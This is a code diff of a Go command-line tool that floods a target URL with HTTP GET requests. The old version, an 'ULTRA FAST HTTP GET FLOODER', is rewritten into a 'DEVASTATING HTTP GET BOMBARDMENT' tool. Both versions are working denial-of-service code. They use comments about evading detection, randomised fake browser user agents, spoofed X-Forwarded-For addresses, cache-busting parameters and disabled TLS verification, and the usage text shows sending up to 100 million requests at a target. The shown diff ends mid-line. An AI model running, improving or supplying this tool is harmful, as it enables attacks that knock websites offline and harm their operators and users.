@@ -1,347 +1,594 @@
 package main
 
 import (
+	"crypto/rand"
 	"crypto/tls"
 	"flag"
 	"fmt"
-	"io"
-	"math/rand"
+	"math/big"
+	mathrand "math/rand"
+	"net"
 	"net/http"
 	"net/url"
 	"os"
-	"runtime"
-	"strings"
+	"strconv"
 	"sync"
 	"sync/atomic"
 	"time"
 )
 
-// Global statistics counters
+// Enhanced statistics tracking
+type Stats struct {
+	RequestsSent       uint64
+	SuccessfulRequests uint64
+	FailedRequests     uint64
+	BytesSent          uint64
+	ConnectionErrors   uint64
+	TimeoutErrors      uint64
+	HTTPErrors         uint64
+	TotalLatency       uint64
+	MinLatency         uint64
+	MaxLatency         uint64
+}
+
+// Ultra-efficient configuration
+type Config struct {
+	URL            string
+	RequestCount   uint64
+	Timeout        time.Duration
+	UserAgentMode  string
+	RefererMode    string
+}
+
+// User Agent Generator structure
+type UserAgentGenerator struct {
+	browsers         []BrowserTemplate
+	operatingSystems []OSTemplate
+	devices          []DeviceTemplate
+	engines          []EngineTemplate
+	platforms        []PlatformTemplate
+	mu               sync.RWMutex
+}
+
+type BrowserTemplate struct {
+	Name     string
+	Versions []string
+	Market   float64
+}
+
+type OSTemplate struct {
+	Name     string
+	Versions []string
+	Arch     []string
+	Market   float64
+}
+
+type DeviceTemplate struct {
+	Type    string
+	Models  []string
+	Market  float64
+}
+
+type EngineTemplate struct {
+	Name     string
+	Versions []string
+}
+
+type PlatformTemplate struct {
+	Name      string
+	Versions  []string
+	Languages []string
+}
+
+// IP Pool for advanced spoofing
+type IPPool struct {
+	IPv4Ranges []string
+	IPv6Ranges []string
+	mu         sync.RWMutex
+}
+
+
+
+
+
+// Global variables
 var (
-	successCount uint64
-	failCount    uint64
-	totalSent    uint64
+	stats            Stats
+	config           Config
+	uaGenerator      *UserAgentGenerator
+	ipPool           *IPPool
+	referers         []string
+	charset          = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
+	targetURL        *url.URL
+	startTime        time.Time
+	httpClient       *http.Client
+	printMutex       sync.Mutex
+	randomSource     = mathrand.NewSource(time.Now().UnixNano())
+	random           = mathrand.New(randomSource)
 )
 
-// UserAgents for rotation to evade detection
-var userAgents = []string{
-	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
-	"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36",
-	"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:90.0) Gecko/20100101 Firefox/90.0",
-	"Mozilla/5.0 (Macintosh; Intel Mac OS X 11.5; rv:90.0) Gecko/20100101 Firefox/90.0",
-	"Mozilla/5.0 (Macintosh; Intel Mac OS X 11_5_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Safari/605.1.15",
-	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.164 Safari/537.36 Edg/91.0.864.71",
-	"Mozilla/5.0 (iPhone; CPU iPhone OS 14_7_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Mobile/15E148 Safari/604.1",
-	"Mozilla/5.0 (iPad; CPU OS 14_7_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Mobile/15E148 Safari/604.1",
-	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36 OPR/78.0.4093.112",
-	"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:78.0) Gecko/20100101 Firefox/78.0",
+// Initialize advanced user agent generator
+func initUserAgentGenerator() {
+	uaGenerator = &UserAgentGenerator{
+		browsers: []BrowserTemplate{
+			{Name: "Chrome", Versions: generateVersions("120", "127", 4), Market: 65.0},
+			{Name: "Firefox", Versions: generateVersions("118", "123", 2), Market: 12.0},
+			{Name: "Safari", Versions: generateVersions("16", "17", 1), Market: 18.0},
+			{Name: "Edge", Versions: generateVersions("118", "123", 3), Market: 4.0},
+			{Name: "Opera", Versions: generateVersions("104", "109", 2), Market: 1.0},
+		},
+		operatingSystems: []OSTemplate{
+			{Name: "Windows NT", Versions: []string{"10.0", "11.0"}, Arch: []string{"Win64; x64", "WOW64"}, Market: 72.0},
+			{Name: "Macintosh", Versions: []string{"Intel Mac OS X 10_15_7", "Intel Mac OS X 11_7_10", "Intel Mac OS X 12_7_2", "Intel Mac OS X 13_6_3", "Intel Mac OS X 14_2_1"}, Arch: []string{""}, Market: 15.0},
+			{Name: "X11", Versions: []string{"Linux x86_64", "Linux i686", "Ubuntu", "Fedora"}, Arch: []string{""}, Market: 4.0},
+			{Name: "Android", Versions: generateVersions("10", "14", 1), Arch: []string{""}, Market: 7.0},
+			{Name: "iPhone", Versions: generateVersions("15", "17", 1), Arch: []string{""}, Market: 2.0},
+		},
+		devices: []DeviceTemplate{
+			{Type: "Desktop", Models: []string{""}, Market: 60.0},
+			{Type: "Mobile", Models: []string{"SM-G998B", "Pixel 8", "iPhone15,2", "SM-A525F"}, Market: 35.0},
+			{Type: "Tablet", Models: []string{"iPad13,1", "SM-T870"}, Market: 5.0},
+		},
+		engines: []EngineTemplate{
+			{Name: "Blink", Versions: generateVersions("537", "540", 1)},
+			{Name: "Gecko", Versions: generateVersions("20100101", "20100101", 0)},
+			{Name: "WebKit", Versions: generateVersions("605", "608", 1)},
+		},
+		platforms: []PlatformTemplate{
+			{Name: "X11", Versions: []string{"Linux x86_64"}, Languages: []string{"en-US", "en-GB", "de-DE", "fr-FR"}},
+			{Name: "Windows", Versions: []string{"Windows NT 10.0"}, Languages: []string{"en-US", "en-GB", "de-DE", "fr-FR"}},
+			{Name: "Macintosh", Versions: []string{"Intel Mac OS X 10_15_7"}, Languages: []string{"en-US", "en-GB"}},
+		},
+	}
 }
 
-// Referers for rotation to evade detection
-var referers = []string{
-	"https://www.google.com/",
-	"https://www.bing.com/",
-	"https://search.yahoo.com/",
-	"https://www.facebook.com/",
-	"https://twitter.com/",
-	"https://www.reddit.com/",
-	"https://www.linkedin.com/",
-	"https://www.youtube.com/",
-	"https://www.instagram.com/",
-	"https://www.amazon.com/",
+// Generate version ranges
+func generateVersions(start, end string, increment int) []string {
+	startNum, _ := strconv.Atoi(start)
+	endNum, _ := strconv.Atoi(end)
+	var versions []string
+	
+	for i := startNum; i <= endNum; i += increment {
+		for j := 0; j < 10; j++ {
+			for k := 0; k < 100; k += 10 {
+				versions = append(versions, fmt.Sprintf("%d.%d.%d", i, j, k))
+			}
+		}
+	}
+	return versions
 }
 
-// AcceptHeaders for rotation to evade detection
-var acceptHeaders = []string{
-	"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
-	"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
-	"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
-	"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
+// Generate realistic user agent
+func (ua *UserAgentGenerator) GenerateUserAgent() string {
+	ua.mu.RLock()
+	defer ua.mu.RUnlock()
+
+	// Select browser based on market share
+	browser := ua.selectBrowser()
+	os := ua.selectOS()
+	device := ua.selectDevice()
+
+	switch browser.Name {
+	case "Chrome":
+		return ua.generateChromeUA(browser, os, device)
+	case "Firefox":
+		return ua.generateFirefoxUA(browser, os, device)
+	case "Safari":
+		return ua.generateSafariUA(browser, os, device)
+	case "Edge":
+		return ua.generateEdgeUA(browser, os, device)
+	case "Opera":
+		return ua.generateOperaUA(browser, os, device)
+	default:
+		return ua.generateChromeUA(browser, os, device)
+	}
 }
 
-// AcceptLanguages for rotation to evade detection
-var acceptLanguages = []string{
-	"en-US,en;q=0.9",
-	"en-GB,en;q=0.9",
-	"en-CA,en;q=0.9",
-	"en-AU,en;q=0.9",
-	"fr-FR,fr;q=0.9,en;q=0.8",
-	"de-DE,de;q=0.9,en;q=0.8",
-	"es-ES,es;q=0.9,en;q=0.8",
-	"it-IT,it;q=0.9,en;q=0.8",
-	"ja-JP,ja;q=0.9,en;q=0.8",
-	"zh-CN,zh;q=0.9,en;q=0.8",
+func (ua *UserAgentGenerator) selectBrowser() BrowserTemplate {
+	total := 0.0
+	for _, item := range ua.browsers {
+		total += item.Market
+	}
+	r := random.Float64() * total
+	current := 0.0
+	for _, item := range ua.browsers {
+		current += item.Market
+		if r <= current {
+			return item
+		}
+	}
+	return ua.browsers[0]
 }
 
-// Random string generator for cache busting
+func (ua *UserAgentGenerator) selectOS() OSTemplate {
+	total := 0.0
+	for _, item := range ua.operatingSystems {
+		total += item.Market
+	}
+	r := random.Float64() * total
+	current := 0.0
+	for _, item := range ua.operatingSystems {
+		current += item.Market
+		if r <= current {
+			return item
+		}
+	}
+	return ua.operatingSystems[0]
+}
+
+func (ua *UserAgentGenerator) selectDevice() DeviceTemplate {
+	total := 0.0
+	for _, item := range ua.devices {
+		total += item.Market
+	}
+	r := random.Float64() * total
+	current := 0.0
+	for _, item := range ua.devices {
+		current += item.Market
+		if r <= current {
+			return item
+		}
+	}
+	return ua.devices[0]
+}
+
+func (ua *UserAgentGenerator) generateChromeUA(browser BrowserTemplate, os OSTemplate, device DeviceTemplate) string {
+	version := browser.Versions[random.Intn(len(browser.Versions))]
+	osVersion := os.Versions[random.Intn(len(os.Versions))]
+	webkitVersion := "537.36"
+	
+	if os.Name == "Windows NT" {
+		arch := os.Arch[random.Intn(len(os.Arch))]
+		return fmt.Sprintf("Mozilla/5.0 (%s %s; %s) AppleWebKit/%s (KHTML, like Gecko) Chrome/%s Safari/%s",
+			os.Name, osVersion, arch, webkitVersion, version, webkitVersion)
+	} else if os.Name == "Macintosh" {
+		return fmt.Sprintf("Mozilla/5.0 (%s; %s) AppleWebKit/%s (KHTML, like Gecko) Chrome/%s Safari/%s",
+			os.Name, osVersion, webkitVersion, version, webkitVersion)
+	} else if os.Name == "X11" {
+		return fmt.Sprintf("Mozilla/5.0 (%s; %s) AppleWebKit/%s (KHTML, like Gecko) Chrome/%s Safari/%s",
+			os.Name, osVersion, webkitVersion, version, webkitVersion)
+	}
+	
+	return fmt.Sprintf("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/%s Safari/537.36", version)
+}
+
+func (ua *UserAgentGenerator) generateFirefoxUA(browser BrowserTemplate, os OSTemplate, device DeviceTemplate) string {
+	version := browser.Versions[random.Intn(len(browser.Versions))]
+	osVersion := os.Versions[random.Intn(len(os.Versions))]
+	
+	if os.Name == "Windows NT" {
+		arch := os.Arch[random.Intn(len(os.Arch))]
+		return fmt.Sprintf("Mozilla/5.0 (%s %s; %s; rv:%s) Gecko/20100101 Firefox/%s",
+			os.Name, osVersion, arch, version, version)
+	} else if os.Name == "Macintosh" {
+		return fmt.Sprintf("Mozilla/5.0 (%s; %s) Gecko/20100101 Firefox/%s",
+			os.Name, osVersion, version)
+	} else if os.Name == "X11" {
+		return fmt.Sprintf("Mozilla/5.0 (%s; %s; rv:%s) Gecko/20100101 Firefox/%s",
+			os.Name, osVersion, version, version)
+	}
+	
+	return fmt.Sprintf("Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:%s) Gecko/20100101 Firefox/%s", version, version)
+}
+
+func (ua *UserAgentGenerator) generateSafariUA(browser BrowserTemplate, os OSTemplate, device DeviceTemplate) string {
+	version := browser.Versions[random.Intn(len(browser.Versions))]
+	osVersion := os.Versions[random.Intn(len(os.Versions))]
+	webkitVersion := fmt.Sprintf("605.1.%d", 10+random.Intn(20))
+	
+	return fmt.Sprintf("Mozilla/5.0 (Macintosh; %s) AppleWebKit/%s (KHTML, like Gecko) Version/%s Safari/%s",
+		osVersion, webkitVersion, version, webkitVersion)
+}
+
+func (ua *UserAgentGenerator) generateEdgeUA(browser BrowserTemplate, os OSTemplate, device DeviceTemplate) string {
+	version := browser.Versions[random.Intn(len(browser.Versions))]
+	osVersion := os.Versions[random.Intn(len(os.Versions))]
+	
+	return fmt.Sprintf("Mozilla/5.0 (Windows NT %s; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/%s Safari/537.36 Edg/%s",
+		osVersion, version, version)
+}
+
+func (ua *UserAgentGenerator) generateOperaUA(browser BrowserTemplate, os OSTemplate, device DeviceTemplate) string {
+	version := browser.Versions[random.Intn(len(browser.Versions))]
+	chromeVersion := fmt.Sprintf("%d.0.0.0", 100+random.Intn(30))
+	
+	return fmt.Sprintf("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/%s Safari/537.36 OPR/%s",
+		chromeVersion, version)
+}
+
+// Initialize IP pool for advanced spoofing
+func initIPPool() {
+	ipPool = &IPPool{
+		IPv4Ranges: []string{
+			"1.0.0.0/8", "2.0.0.0/8", "3.0.0.0/8", "4.0.0.0/8", "5.0.0.0/8",
+			"8.0.0.0/8", "9.0.0.0/8", "11.0.0.0/8", "12.0.0.0/8", "13.0.0.0/8",
+			"15.0.0.0/8", "16.0.0.0/8", "17.0.0.0/8", "18.0.0.0/8", "19.0.0.0/8",
+			"20.0.0.0/8", "21.0.0.0/8", "22.0.0.0/8", "23.0.0.0/8", "24.0.0.0/8",
+		},
+		IPv6Ranges: []string{
+			"2001:db8::/32", "2001::/16", "2002::/16", "2003::/16",
+		},
+	}
+}
+
+// Generate random IP from ranges
+func (ip *IPPool) GenerateRandomIPv4() string {
+	ip.mu.RLock()
+	defer ip.mu.RUnlock()
+	
+	return fmt.Sprintf("%d.%d.%d.%d", 
+		1+random.Intn(254), 
+		random.Intn(256), 
+		random.Intn(256), 
+		1+random.Intn(254))
+}
+
+func (ip *IPPool) GenerateRandomIPv6() string {
+	ip.mu.RLock()
+	defer ip.mu.RUnlock()
+	
+	return fmt.Sprintf("2001:db8:%x:%x:%x:%x:%x:%x",
+		random.Intn(65536), random.Intn(65536), random.Intn(65536), random.Intn(65536),
+		random.Intn(65536), random.Intn(65536), random.Intn(65536), random.Intn(65536))
+}
+
+// Initialize minimal referers
+func initAdvancedReferers() {
+	referers = []string{
+		"https://www.google.com/",
+		"https://www.bing.com/",
+		"https://www.facebook.com/",
+		"https://twitter.com/",
+		"https://www.instagram.com/",
+	}
+}
+
+// Initialize single ultra-efficient HTTP client
+func initHTTPClient() {
+	httpClient = createOptimizedClient()
+}
+
+// Create ultra-minimal HTTP client for devastating impact
+func createOptimizedClient() *http.Client {
+	// Minimal TLS config for speed
+	tlsConfig := &tls.Config{
+		InsecureSkipVerify: true,
+	}
+
+	// Ultra-fast dialer
+	dialer := &net.Dialer{
+		Timeout:   1 * time.Second,
+		KeepAlive: 5 * time.Second,
+		DualStack: false, // IPv4 only for speed
+	}
+
+	// Minimal transport for maximum speed
+	transport := &http.Transport{
+		DialContext:                dialer.DialContext,
+		MaxIdleConns:               1, // Single connection reuse
+		MaxIdleConnsPerHost:        1, // Minimal resource usage
+		MaxConnsPerHost:            1, // Single connection
+		IdleConnTimeout:            5 * time.Second,
+		TLSHandshakeTimeout:        1 * time.Second,
+		ExpectContinueTimeout:      100 * time.Millisecond,
+		ResponseHeaderTimeout:      2 * time.Second,
+		DisableKeepAlives:          false,
+		DisableCompression:         true, // Disable for speed
+		ForceAttemptHTTP2:          false, // HTTP/1.1 only
+		TLSClientConfig:            tlsConfig,
+		WriteBufferSize:            4 * 1024, // Minimal buffer
+		ReadBufferSize:             4 * 1024, // Minimal buffer
+	}
+
+	return &http.Client{
+		Transport: transport,
+		Timeout:   3 * time.Second, // Fast timeout
+		CheckRedirect: func(req *http.Request, via []*http.Request) error {
+			return http.ErrUseLastResponse // No redirects for speed
+		},
+	}
+}
+
+
+
+// Generate random string
 func randomString(length int) string {
-	const charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
 	b := make([]byte, length)
 	for i := range b {
-		b[i] = charset[rand.Intn(len(charset))]
+		b[i] = charset[random.Intn(len(charset))]
 	}
 	return string(b)
 }
 
-// Advanced HTTP client with evasion techniques
-func createAdvancedClient(timeout time.Duration, keepAlive time.Duration, disableCompression bool, disableKeepAlives bool) *http.Client {
-	transport := &http.Transport{
-		TLSClientConfig: &tls.Config{
-			InsecureSkipVerify: true,
-			MinVersion:         tls.VersionTLS12,
-			MaxVersion:         tls.VersionTLS13,
-			CipherSuites: []uint16{
-				tls.TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,
-				tls.TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,
-				tls.TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,
-				tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
-				tls.TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305,
-				tls.TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305,
-			},
-		},
-		DisableKeepAlives:     disableKeepAlives,
-		MaxIdleConns:          100,
-		MaxIdleConnsPerHost:   100,
-		MaxConnsPerHost:       0, // Unlimited
-		IdleConnTimeout:       keepAlive,
-		ResponseHeaderTimeout: timeout,
-		ExpectContinueTimeout: 1 * time.Second,
-		ForceAttemptHTTP2:     true,
-		DisableCompression:    disableCompression,
+// Generate cryptographically secure random string
+func secureRandomString(length int) string {
+	const charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
+	b := make([]byte, length)
+	for i := range b {
+		num, _ := rand.Int(rand.Reader, big.NewInt(int64(len(charset))))
+		b[i] = charset[num.Int64()]
 	}
-
-	return &http.Client{
-		Timeout:   timeout,
-		Transport: transport,
-		CheckRedirect: func(req *http.Request, via []*http.Request) error {
-			// Allow up to 10 redirects
-			if len(via) >= 10 {
-				return http.ErrUseLastResponse
-			}
-			// Update headers on redirect to maintain evasion
-			req.Header.Set("User-Agent", userAgents[rand.Intn(len(userAgents))])
-			req.Header.Set("Referer", referers[rand.Intn(len(referers))])
-			return nil
-		},
-	}
+	return string(b)
 }
 
-// Prepare request with evasion techniques
-func prepareRequest(targetURL string, method string, headers map[string]string, cookies map[string]string, cacheBuster bool) (*http.Request, error) {
-	parsedURL, err := url.Parse(targetURL)
+
+
+// Create ultra-minimal request for devastating impact
+func createMinimalRequest() (*http.Request, error) {
+	// Direct request creation - no URL modification for speed
+	req, err := http.NewRequest("GET", config.URL, nil)
 	if err != nil {
 		return nil, err
 	}
 
-	// Add cache busting parameter if enabled
-	if cacheBuster {
-		q := parsedURL.Query()
-		q.Add(randomString(8), randomString(16))
-		parsedURL.RawQuery = q.Encode()
-	}
-
-	req, err := http.NewRequest(method, parsedURL.String(), nil)
-	if err != nil {
-		return nil, err
-	}
-
-	// Set random User-Agent
-	req.Header.Set("User-Agent", userAgents[rand.Intn(len(userAgents))])
-
-	// Set random Referer
-	req.Header.Set("Referer", referers[rand.Intn(len(referers))])
-
-	// Set random Accept header
-	req.Header.Set("Accept", acceptHeaders[rand.Intn(len(acceptHeaders))])
-
-	// Set random Accept-Language header
-	req.Header.Set("Accept-Language", acceptLanguages[rand.Intn(len(acceptLanguages))])
-
-	// Set Connection header to appear more like a browser
+	// Minimal headers for maximum speed and devastating impact
+	req.Header.Set("User-Agent", uaGenerator.GenerateUserAgent())
 	req.Header.Set("Connection", "keep-alive")
-
-	// Set random DNT (Do Not Track) value
-	if rand.Intn(2) == 0 {
-		req.Header.Set("DNT", "1")
-	}
-
-	// Add custom headers
-	for key, value := range headers {
-		req.Header.Set(key, value)
-	}
-
-	// Add cookies
-	for name, value := range cookies {
-		req.AddCookie(&http.Cookie{
-			Name:  name,
-			Value: value,
-		})
+	
+	// Single effective bypass header (lightweight but impactful)
+	if random.Intn(2) == 0 { // 50% chance
+		req.Header.Set("X-Forwarded-For", ipPool.GenerateRandomIPv4())
 	}
 
 	return req, nil
 }
 
-// Worker function to send requests
-func worker(id int, targetURL string, method string, headers map[string]string, cookies map[string]string, 
-			timeout time.Duration, keepAlive time.Duration, disableCompression bool, disableKeepAlives bool, 
-			cacheBuster bool, delay time.Duration, jitter int, wg *sync.WaitGroup) {
-	defer wg.Done()
-
-	// Create client with advanced settings
-	client := createAdvancedClient(timeout, keepAlive, disableCompression, disableKeepAlives)
-
-	// Local counters for this worker
-	var localSuccess, localFail uint64
-
-	for {
-		// Prepare request with evasion techniques
-		req, err := prepareRequest(targetURL, method, headers, cookies, cacheBuster)
+// Ultra-efficient request engine for devastating impact
+func executeRequestBombardment() {
+	fmt.Printf("Launching devastating bombardment...\n")
+	
+	for i := uint64(0); i < config.RequestCount; i++ {
+		// Create minimal request
+		req, err := createMinimalRequest()
 		if err != nil {
-			atomic.AddUint64(&failCount, 1)
+			atomic.AddUint64(&stats.FailedRequests, 1)
 			continue
 		}
 
-		// Send request
-		resp, err := client.Do(req)
+		// Fire request with minimal processing
+		resp, err := httpClient.Do(req)
+		atomic.AddUint64(&stats.RequestsSent, 1)
 
 		if err != nil {
-			atomic.AddUint64(&failCount, 1)
-			localFail++
+			atomic.AddUint64(&stats.FailedRequests, 1)
 		} else {
-			// Discard response body to free connections
-			io.Copy(io.Discard, resp.Body)
-			resp.Body.Close()
-
-			atomic.AddUint64(&successCount, 1)
-			localSuccess++
-
-			// Adaptive behavior based on response
-			if resp.StatusCode == 429 || resp.StatusCode == 503 {
-				// If rate limited, back off slightly
-				time.Sleep(time.Duration(rand.Intn(500)+500) * time.Millisecond)
+			atomic.AddUint64(&stats.SuccessfulRequests, 1)
+			// Immediately discard response for speed
+			if resp.Body != nil {
+				resp.Body.Close()
 			}
 		}
 
-		atomic.AddUint64(&totalSent, 1)
-
-		// Apply delay with jitter to appear more like real traffic
-		if delay > 0 {
-			jitterMs := 0
-			if jitter > 0 {
-				jitterMs = rand.Intn(jitter)
-			}
-			time.Sleep(delay + time.Duration(jitterMs)*time.Millisecond)
+		// Minimal delay for ultra-low resource usage
+		if i%1000 == 0 { // Every 1000 requests
+			time.Sleep(time.Microsecond * 100) // 0.1ms pause
 		}
 	}
 }
 
-// Display statistics in real-time
-func statsReporter(interval time.Duration, startTime time.Time) {
-	ticker := time.NewTicker(interval)
+// Ultra-minimal progress display
+func printProgress() {
+	ticker := time.NewTicker(2 * time.Second)
 	defer ticker.Stop()
 
-	var lastTotal uint64
+	for {
+		elapsed := time.Since(startTime)
+		requestsSent := atomic.LoadUint64(&stats.RequestsSent)
+		successful := atomic.LoadUint64(&stats.SuccessfulRequests)
+		failed := atomic.LoadUint64(&stats.FailedRequests)
 
-	for range ticker.C {
-		current := atomic.LoadUint64(&totalSent)
-		success := atomic.LoadUint64(&successCount)
-		fail := atomic.LoadUint64(&failCount)
-		elapsed := time.Since(startTime).Seconds()
-		rps := float64(current) / elapsed
-		currentRps := float64(current-lastTotal) / interval.Seconds()
-		lastTotal = current
+		if requestsSent >= config.RequestCount {
+			break
+		}
 
-		fmt.Printf("[STATUS] Requests: %d | Success: %d | Failed: %d | RPS: %.2f | Current RPS: %.2f | Uptime: %.1fs\n",
-			current, success, fail, rps, currentRps, elapsed)
+		// Calculate progress and speed
+		progress := float64(requestsSent) / float64(config.RequestCount) * 100
+		rps := float64(requestsSent) / elapsed.Seconds()
+		
+		printMutex.Lock()
+		fmt.Printf("\rProgress: %.1f%% | RPS: %.0f | Sent: %d/%d | Success: %d | Failed: %d",
+			progress, rps, requestsSent, config.RequestCount, successful, failed)
+		printMutex.Unlock()
+		
+		time.Sleep(2 * time.Second)
 	}
 }
 
-func main() {
-	// Seed the random number generator
-	rand.Seed(time.Now().UnixNano())
-
-	// Command line flags
-	targetURL := flag.String("url", "", "Target URL (required)")
-	workers := flag.Int("workers", runtime.NumCPU()*10, "Number of concurrent workers")
-	timeoutMs := flag.Int("timeout", 5000, "Request timeout in milliseconds")
-	keepAliveMs := flag.Int("keepalive", 30000, "Keep-alive timeout in milliseconds")
-	method := flag.String("method", "GET", "HTTP method to use (GET, HEAD)")
-	disableCompression := flag.Bool("no-compression", false, "Disable compression")
-	disableKeepAlives := flag.Bool("no-keepalive", false, "Disable keep-alives")
-	cacheBuster := flag.Bool("cache-buster", true, "Add random query parameters to bust cache")
-	delayMs := flag.Int("delay", 0, "Delay between requests in milliseconds (per worker)")
-	jitterMs := flag.Int("jitter", 0, "Random jitter added to delay in milliseconds")
-	headersList := flag.String("headers", "", "Custom headers (format: 'Name1:Value1,Name2:Value2')")
-	cookiesList := flag.String("cookies", "", "Cookies to send (format: 'Name1=Value1,Name2=Value2')")
-	statsIntervalSec := flag.Int("stats-interval", 1, "Statistics display interval in seconds")
+// Parse command line flags
+func parseFlags() {
+	flag.StringVar(&config.URL, "url", "", "Target URL (required)")
+	flag.Uint64Var(&config.RequestCount, "count", 100000, "Number of requests to send")
 
 	flag.Parse()
 
-	// Validate required parameters
-	if *targetURL == "" {
-		fmt.Println("Error: Target URL is required")
-		flag.Usage()
+	if config.URL == "" {
+		fmt.Println("╔══════════════════════════════════════════════════════════════════════════════╗")
+		fmt.Println("║                    DEVASTATING HTTP GET BOMBARDMENT v3.0                    ║")
+		fmt.Println("║                    Ultra-Low Resource | Maximum Impact                      ║")
+		fmt.Println("╚══════════════════════════════════════════════════════════════════════════════╝")
+		fmt.Println()
+		fmt.Println("Usage: go run main.go -url <target> [options]")
+		fmt.Println()
+		fmt.Println("Required:")
+		fmt.Println("  -url string     Target URL to bombard")
+		fmt.Println()
+		fmt.Println("Optional:")
+		fmt.Println("  -count uint64   Number of requests to send (default: 100000)")
+		fmt.Println()
+		fmt.Println("Examples:")
+		fmt.Println("  go run main.go -url https://target.com")
+		fmt.Println("  go run main.go -url https://target.com -count 1000000")
+		fmt.Println("  go run main.go -url https://target.com -count 100000000")
+		fmt.Println()
 		os.Exit(1)
 	}
 
-	// Parse custom headers
-	headers := make(map[string]string)
-	if *headersList != "" {
-		for _, header := range strings.Split(*headersList, ",") {
-			parts := strings.SplitN(header, ":", 2)
-			if len(parts) == 2 {
-				headers[strings.TrimSpace(parts[0])] = strings.TrimSpace(parts[1])
-			}
-		}
+	// Set ultra-minimal configuration for maximum speed
+	config.Timeout = 3 * time.Second
+	config.UserAgentMode = "random"
+	config.RefererMode = "random"
+
+	targetURL, err := url.Parse(config.URL)
+	if err != nil {
+		fmt.Printf("Error parsing URL: %v\n", err)
+		os.Exit(1)
+	}
+	_ = targetURL
+}
+
+// Format duration
+func formatDuration(d time.Duration) string {
+	totalSeconds := int(d.Seconds())
+	minutes := totalSeconds / 60
+	seconds := totalSeconds % 60
+	return fmt.Sprintf("%02d:%02d", minutes, seconds)
+}
+
+func main() {
+	parseFlags()
+
+	// Initialize minimal components
+	initUserAgentGenerator()
+	initIPPool()
+	initAdvancedReferers()
+	initHTTPClient()
+
+	startTime = time.Now()
+
+	// Print devastating banner
+	fmt.Println("╔══════════════════════════════════════════════════════════════════════════════╗")
+	fmt.Println("║                    DEVASTATING HTTP GET BOMBARDMENT v3.0                    ║")
+	fmt.Println("║                    Ultra-Low Resource | Maximum Impact                      ║")
+	fmt.Println("╚══════════════════════════════════════════════════════════════════════════════╝")
+	fmt.Printf("Target: %s\n", config.URL)
+	fmt.Printf("Request Count: %d\n", config.RequestCount)
+	fmt.Printf("Features: Ultra-Minimal Resource | Single Connection | Maximum Speed | Devastating Impact\n")
+
+	// Start progress monitor
+	go printProgress()
+
+	// Execute devastating bombardment
+	executeRequestBombardment()
+
+	// Final statistics
+	elapsed := time.Since(startTime)
+	requestsSent := atomic.LoadUint64(&stats.RequestsSent)
+	successful := atomic.LoadUint64(&stats.SuccessfulRequests)
+	failed := atomic.LoadUint64(&stats.FailedRequests)
+
+	rps := float64(requestsSent) / elapsed.Seconds()
+	successRate := 0.0
+	if requestsSent > 0 {
+		successRate = float64(successful) / float64(requestsSent) * 100
 	}
 
-	// Parse cookies
-	cookies := make(map[string]string)
-	if *cookiesList != "" {
-		for _, cookie := range strings.Split(*cookiesList, ",") {
-			parts := strings.SplitN(cookie, "=", 2)
-			if len(parts) == 2 {
-				cookies[strings.TrimSpace(parts[0])] = strings.TrimSpace(parts[1])
-			}
-		}
-	}
-
-	// Configure timeouts
-	timeout := time.Duration(*timeoutMs) * time.Millisecond
-	keepAlive := time.Duration(*keepAliveMs) * time.Millisecond
-	delay := time.Duration(*delayMs) * time.Millisecond
-	statsInterval := time.Duration(*statsIntervalSec) * time.Second
-
-	// Print configuration
-	fmt.Println("╔═════════════════════════════════════════════════════╗")
-	fmt.Println("║             ULTRA FAST HTTP GET FLOODER            ║")
-	fmt.Println("╚═════════════════════════════════════════════════════╝")
-	fmt.Printf("Target URL: %s\n", *targetURL)
-	fmt.Printf("Method: %s\n", *method)
-	fmt.Printf("Workers: %d\n", *workers)
-	fmt.Printf("Timeout: %v\n", timeout)
-	fmt.Printf("Keep-Alive: %v\n", keepAlive)
-	fmt.Printf("Compression disabled: %v\n", *disableCompression)
-	fmt.Printf("Keep-Alives disabled: %v\n", *disableKeepAlives)
-	fmt.Printf("Cache-Buster: %v\n", *cacheBuster)
-	fmt.Printf("Delay: %v\n", delay)
-	fmt.Printf("Jitter: %dms\n", *jitterMs)
-	fmt.Println("Starting attack...")
-
-	// Start time for statistics
-	startTime := time.Now()
-
-	// Start statistics reporter
-	go statsReporter(statsInterval, startTime)
-
-	// Start workers
-	var wg sync.WaitGroup
-	for i := 0; i < *workers; i++ {
-		wg.Add(1)
-		go worker(i, *targetURL, *method, headers, cookies, timeout, keepAlive, 
